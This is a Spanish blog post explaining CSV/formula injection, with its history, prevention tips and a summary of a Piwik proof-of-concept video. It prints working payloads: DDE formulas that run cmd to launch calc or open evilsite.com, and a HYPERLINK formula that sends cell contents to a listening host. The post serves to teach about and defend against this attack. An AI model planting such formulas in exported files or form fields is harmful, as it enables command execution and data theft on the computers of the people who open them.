---
layout: post
title: Inyección de CSV 
category: Hacking
comments: true
description: La inyección de CSV es un tipo de ataque que fue descubierto por primera vez en 2014, consiste en que el atacante introduce codigo malicioso en formularios que luego seran descargados en excel o csv. El ataque va dirigido a quien se descarga el fichero, normalmente es un ataque que no se suele tener en cuenta, por ejemplo el programa de Bug hunting de Google no lo considera como una vulnerabilidad que entre dentro de su programa de recompensas.
tags:   
    - hacker
    - owasp
    - injection

---

La inyección de CSV es un tipo de ataque que fue descubierto por primera vez en [2014](https://www.contextis.com/blog/comma-separated-vulnerabilities){:target="_blank"}, consiste en que el atacante introduce codigo malicioso en formularios que luego seran descargados en excel o csv. El ataque va dirigido a quien se descarga el fichero, normalmente es un ataque que no se suele tener en cuenta, por ejemplo el programa de [Bug hunting de Google](https://sites.google.com/site/bughunteruniversity/nonvuln/csv-excel-formula-injection){:target="_blank"} no lo considera como una vulnerabilidad que entre dentro de su programa de recompensas, aún asi es un tipo de ataque peligroso y a tener en cuenta.

## Ataque básico

Existen muchos tipos de payload para la inyección de CSV, pero el más común seria este:

{% highlight sql linenos %}

=cmd|' /C calc'!A0

{% endhighlight %}

Lo que hace este payload es ejecutar el programa cmd.exe lanzando la calculadora. En este caso es bastante simple, ya que es una calculadora, pero nos abre las puerta a poder ejecutar cualquier otra aplicación o comando con los permisos del usuario que abra el reporte en ese momento.


## Formulas peligrosas

La gran mayoria de payloads se basaran usando estas dos formulas principales:

* Hiperlink (en español Hipervinculo) esta formula crea un link directo a un recurso, sea de la maquina, de la red o de internet. 

{% highlight sql linenos %}

=HYPERLINK(“http://localhost:4444?leak=”&B2&B3&C2&C3,”más detalles”)

{% endhighlight %}

* Cmd, con este comando, tenemos la posibilidad de ejecutar comandos en el ordenador del usuario del Excel, generalmente el Office, OpenOffice y otros avisan al usuario que hay macros y scripts peligrosos, pero si el usuario ignora estos avisos, puede llegar a comprometer todo el sistema.

{% highlight sql linenos %}

=cmd|' /C explorer http://evilsite.com '!A0

{% endhighlight %}


## Prueba de Concepto

Como una imagen vale más que mil palabras, no hay nada mejor que un este video de youtube donde podrás ver una prueba de concepto de una inyección de CSV. 


<iframe width="560" height="315" src="https://www.youtube.com/embed/SC7AkclnG2g?rel=0" frameborder="0" allowfullscreen></iframe>

Resumen del video:

* Tenemos una pagina web asociada con Piwik (un estilo google Analitycs)
* A través de la url hacemos peticiones web erroneas incluyendo un payload de inyección de csv
* Luego accedemos a la cuenta de Piwik donde descargamos las ultimas visitas a nuestra pagina web
* Abrimos el reporte descargado tanto en Office como en OpenOffice y nos salta la calculadora.


## Prevención

Todos los programas estilo Excel, sea el Google Sheet, el Open Office y el propio Excel ejecutan cualquier cosa que parezca una formula, por lo que es un problema complicado de solucionar, ya que para las empresas detras de este software con avisar y decir que hay una macro y mejor deshabilitarlo ya esta, creo que es un enfoque incorrecto, porque muchos Excels, se usan para compartir información entre aplicaciones, por lo que puedes llegar a provocar un problema peor.

Aun asi, en foros como stackoverflow recomiendan poner un espacio o una comilla delante de cualquier = para asi deshabilitar la ejecucion de formulas automaticamente.



